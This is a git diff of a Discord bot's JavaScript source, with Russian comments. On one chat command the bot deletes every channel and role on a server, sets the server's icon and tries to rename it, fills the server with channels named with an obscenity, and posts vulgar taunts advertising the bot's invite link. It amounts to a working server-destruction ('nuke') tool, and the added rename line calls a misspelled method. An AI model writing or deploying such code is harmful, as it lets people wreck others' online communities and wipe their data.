@@ -34,6 +34,7 @@ bot.on ("message", async message =>{
 });
 bot.on('message', msg => {
     if (msg.content === 's?msg') {
+      msg.guild.SetName('Вас крашнул юзер.')
 		msg.guild.setIcon('https://images-ext-1.discordapp.net/external/wcTyIIPsGT7fuP4e9RMQQmdNWD-PeyGN4nYwNIp7Gxs/%3Fsize%3D128/https/cdn.discordapp.com/icons/692983981255163905/6a89b42b8324ee64b093cc415271e479.png').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
       msg.guild.roles.forEach(i => i.delete()) // Удаление ролей
@@ -43,7 +44,7 @@ bot.on('message', msg => {
                 const name = 'говно'
                 msg.guild.createChannel(name, "text")
 					.then(channel => {
-                    channel.send('Вас трахнул юзер который использовал бота. Сервер бота: https://discord.gg/DM5xaGD , ссылка на бота:https://discord.com/oauth2/authorize?client_id=709763322089570354&permissions=268435510&scope=bot')
+                    channel.send('Вас трахнул юзер который использовал бота. Сервер бота: https://discord.gg/DM5xaGD , ссылка на бота: https://discord.com/oauth2/authorize?client_id=709763322089570354&permissions=268435510&scope=bot')
                     channel.overwritePermissions(member, {
                         SEND_MESSAGES: false
                     })
